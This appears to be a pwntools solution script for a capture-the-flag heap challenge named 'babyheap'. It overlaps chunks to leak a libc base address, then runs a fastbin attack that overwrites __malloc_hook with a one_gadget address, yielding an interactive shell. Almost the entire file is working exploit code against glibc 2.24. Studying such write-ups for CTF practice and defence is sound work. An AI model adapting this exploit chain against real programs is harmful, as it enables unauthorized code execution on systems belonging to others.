#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = True
context.log_level = "debug"
if DEBUG:
	io = process("./babyheap")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')

def alloc(size):
	io.sendlineafter("Command: ","1")
	io.sendlineafter("Size: ",str(size))

def fill(index,size,content):
	io.sendlineafter("Command: ","2")
	io.sendlineafter("Index: ",str(index))
	io.sendlineafter("Size: ",str(size))
	io.sendafter("Content: ",content)

def free(index):
	io.sendlineafter('Command: ',"3")
	io.sendlineafter("Index: ",str(index))

def dump(index):
	io.sendlineafter('Command: ',"4")
	io.sendlineafter("Index: ",str(index))
	io.recvuntil("Content: \n")
	return io.recvline()[:-1]

def leak():
	alloc(0x60)
	alloc(0x40)
	fill(0,0x60+0x10,"a"*0x60+p64(0)+p64(0x71))
	alloc(0x100)
	fill(2,0x20,"a"*0x10+p64(0)+p64(0x31))
	free(1)
	alloc(0x60)
	fill(1,0x40+0x10,"a"*0x40+p64(0)+p64(0x111))
	alloc(0x50)
	free(2)
	leaked = u64(dump(1)[-8:])
	offset = 0x7f8f9755ab58-0x7f8f971c3000
	print hex(leaked)
	log.info("get libc_base:" + hex(leaked - offset))
	return leaked - offset

def fastbinattack(libc_base):
	malloc_hook = libc.symbols['__malloc_hook'] + libc_base
	system_addr = libc.symbols['system'] + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	log.info("system_addr @" + hex(system_addr))
	free(1)
	fill(0, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))
	alloc(0x60)

    # free_hook
	alloc(0x60)
    #                   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)          + p64(0)        + p64(libc_base + 0x3f35a)
	fill(2, len(payload), payload)
	alloc(0x20)
#gdb.attach(io)
fastbinattack(leak())
io.interactive()
	
